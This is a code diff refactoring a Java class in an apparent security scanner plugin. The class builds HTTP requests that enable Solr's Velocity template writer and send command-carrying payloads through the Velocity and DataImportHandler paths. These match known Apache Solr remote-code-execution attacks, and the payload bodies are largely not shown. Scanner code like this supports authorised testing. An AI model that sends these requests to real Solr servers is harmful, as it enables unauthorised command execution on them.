@@ -1,16 +1,19 @@
 package com.gbw.scanner.plugins.scripts.web.solr;
 
+import com.gbw.scanner.Host;
+import com.gbw.scanner.http.GBWHttpGetRequestBuilder;
+import com.gbw.scanner.http.GBWHttpPostRequestBuilder;
 import com.xmap.api.utils.TextUtils;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.client.methods.HttpPost;
 
-import java.net.URI;
+import java.io.IOException;
 import java.net.URLEncoder;
-import java.net.http.HttpRequest;
 import java.nio.charset.Charset;
-import java.time.Duration;
 
 public class SolrHttpRequestBuilder {
 
-    private static final String solrAdminCoreURL = "/solr/admin/cores";
+    private static final String solrAdminCoreURL = "/solr/admin/cores?wt=json";
     private static final String solrConfigURL = "/solr/admin/file/?contentType=text/xml;charset=utf-8&file=solrconfig.xml";
     private static final String UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36";
     private static final String velConfigJson = "{\n" +
@@ -67,89 +70,71 @@ public class SolrHttpRequestBuilder {
         return payload;
     }
 
-    public static HttpRequest makeSolrCoreAdminRequest(String host,int port,int timeout){
+    public static HttpGet makeSolrCoreAdminRequest(Host host, GBWScanSolrScriptConfig config){
 
-        String uri = String.format("http://%s:%d%s?wt=json",host,port,solrAdminCoreURL);
 
-        HttpRequest.Builder builder = HttpRequest.newBuilder()
-                .timeout(Duration.ofMillis(timeout))
-                .header("User-Agent",UA)
-                .GET()
-                .uri(URI.create(uri));
+        return new GBWHttpGetRequestBuilder(host.getProto(),host.getServer(),host.getPort(),solrAdminCoreURL)
+                .addHead("User-Agent",UA)
+                .setTimeout(config.getConTimeout(),config.getReadTimeout())
+                .build();
 
-        return builder.build();
     }
 
-    public static HttpRequest makeSolrCoreConfigRequest(String host, int port, String core, int timeout){
+    public static HttpGet makeSolrCoreConfigRequest(Host host, GBWScanSolrScriptConfig config,String core){
 
         String uri;
 
         if(TextUtils.isEmpty(core))
-            uri = String.format("http://%s:%d%s",host,port,solrConfigURL);
+            uri = String.format("%s",solrConfigURL);
         else
-            uri = String.format("http://%s:%d/solr/%s/config?wt=json",host,port,core);
+            uri = String.format("/solr/%s/config?wt=json",core);
 
-        HttpRequest.Builder builder = HttpRequest.newBuilder()
-                .timeout(Duration.ofMillis(timeout))
-                .header("User-Agent",UA)
-                .GET()
-                .uri(URI.create(uri));
-
-        return builder.build();
+        return new GBWHttpGetRequestBuilder(host.getProto(),host.getServer(),host.getPort(),uri)
+                .addHead("User-Agent",UA)
+                .setTimeout(config.getConTimeout(),config.getReadTimeout())
+                .build();
     }
 
-    public static HttpRequest makeSolrCoreConfigPostRequest(String host,int port,String core,int timeout){
+    public static HttpPost makeSolrCoreConfigPostRequest(Host host, GBWScanSolrScriptConfig config,String core) throws IOException {
 
         String uri;
 
         if(TextUtils.isEmpty(core))
-            uri = String.format("http://%s:%d%s",host,port,solrConfigURL);
+            uri = solrConfigURL;
         else
-            uri = String.format("http://%s:%d/solr/%s/config?wt=json",host,port,core);
+            uri = String.format("/solr/%s/config?wt=json",core);
 
-        HttpRequest.Builder builder = HttpRequest.newBuilder()
-                .timeout(Duration.ofMillis(timeout))
-                .header("User-Agent",UA)
-                .header("Content-Type","application/json")
-                .POST(HttpRequest.BodyPublishers.ofString(velConfigJson))
-                .uri(URI.create(uri));
-
-        return builder.build();
+        return new GBWHttpPostRequestBuilder(host.getProto(),host.getServer(),host.getPort(),uri)
+                .addHead("User-Agent",UA)
+                .addHead("Content-Type","application/json")
+                .setTimeout(config.getConTimeout(),config.getReadTimeout())
+                .postString(velConfigJson,false)
+                .build();
     }
 
-    public static HttpRequest makeSolrCoreAttackRequest(String host,int port,String core,String cmd,boolean isEncode,int timeout){
+    public static HttpGet makeSolrCoreAttackRequest(Host host, GBWScanSolrScriptConfig config, String core){
 
-        String uri = String.format("http://%s:%d%s",host,port,makePayload(cmd,core,isEncode));
-
-        HttpRequest.Builder builder = HttpRequest.newBuilder()
-                .timeout(Duration.ofMillis(timeout))
-                .header("User-Agent",UA)
-                .GET()
-                .uri(URI.create(uri));
-
-        return builder.build();
+        return new GBWHttpGetRequestBuilder(host.getProto(),host.getServer(),host.getPort(),makePayload(config.getCmd(),core,config.isEncode()))
+                .addHead("User-Agent",UA)
+                .setTimeout(config.getConTimeout(),config.getReadTimeout())
+                .build();
     }
 
-    public static HttpRequest makeSolrDataimportPocRequest(String host,int port,String core,String cmd,boolean isEncode,int timeout){
+    public static HttpPost makeSolrDataimportPocRequest(Host host, GBWScanSolrScriptConfig config, String core) throws IOException {
 
-        if(TextUtils.isEmpty(core))
-            core = "collection1";
+        String payload = makeDataImportPayload(config.getCmd(),config.isEncode());
+        String refer = String.format("%s:%s:%d/solr/",TextUtils.isEmpty(host.getProto())?"http":host.getProto(),host.getServer(),host.getPort());
 
-        String uri = String.format("http:%s:%d/solr/%s/dataimport?wt=json",host,port,core);
-        String payload = makeDataImportPayload(cmd,isEncode);
-        String refer = String.format("http:%s:%d/solr/",host,port);
+        return new GBWHttpPostRequestBuilder(host.getProto(),host.getServer(),host.getPort(),String.format("/solr/%s/dataimport?wt=json",core))
+                .addHead("User-Agent",UA)
+                .addHead("Content-Type","application/x-www-form-urlencoded")
+                .addHead("Accept","application/json, text/plain, */*")
+                .addHead("X-Requested-With","XMLHttpRequest")
+                .addHead("Referer",refer)
+                .setTimeout(config.getConTimeout(),config.getReadTimeout())
+                .postString(payload,false)
+                .build();
 
-        HttpRequest.Builder builder = HttpRequest.newBuilder()
-                .timeout(Duration.ofMillis(timeout))
-                .header("User-Agent",UA)
-                .header("Content-Type","application/x-www-form-urlencoded")
-                .header("Accept","application/json, text/plain, */*")
-                .header("X-Requested-With","XMLHttpRequest")
-                .header("Referer",refer)
-                .POST(HttpRequest.BodyPublishers.ofString(payload))
-                .uri(URI.create(uri));
-
-        return builder.build();
     }
 
 }
